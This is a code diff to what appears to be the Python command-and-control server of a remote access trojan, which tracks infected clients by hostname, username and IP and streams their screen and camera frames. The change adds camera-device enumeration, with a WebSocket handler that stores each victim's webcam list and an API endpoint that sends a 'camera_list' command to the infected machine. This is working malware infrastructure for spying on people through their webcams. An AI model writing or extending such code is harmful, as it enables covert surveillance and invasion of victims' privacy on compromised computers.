@@ -22,6 +22,8 @@ rdp_frames = {}
 rdp_frames_lock = threading.Lock()
 camera_frames = {}
 camera_frames_lock = threading.Lock()
+camera_devices = {}
+camera_devices_lock = threading.Lock()
 
 # WebSocket connected clients: client_id -> {ws, hostname, username, ip, user_id}
 ws_clients = {}
@@ -864,6 +866,10 @@ def c2_websocket(ws):
             msg = json.loads(data)
             if msg.get('type') == 'pong':
                 continue
+            if msg.get('type') == 'camera_list':
+                with camera_devices_lock:
+                    camera_devices[client_id] = msg.get('devices', [])
+                continue
             with get_db() as db:
                 db.execute('UPDATE clients SET last_heartbeat = CURRENT_TIMESTAMP WHERE client_id = ?', (client_id,))
                 db.commit()
@@ -993,6 +999,25 @@ def c2_get_camera_frame(client_id):
         'ts': frame['ts'],
         'b64': base64.b64encode(frame['data']).decode('ascii')
     })
+
+
+@app.route('/api/c2/camera_devices/<client_id>')
+@login_required
+def c2_get_camera_devices(client_id):
+    user = request.current_user
+    with camera_devices_lock:
+        devices = camera_devices.get(client_id)
+    if devices is None:
+        # Request device list from client via WS
+        with ws_clients_lock:
+            wsc = ws_clients.get(client_id)
+        if wsc:
+            try:
+                wsc['ws'].send(json.dumps({'type': 'command', 'command': 'camera_list'}))
+            except Exception:
+                pass
+        return jsonify([])
+    return jsonify(devices)
 
 
 # ===== BUILDER =====
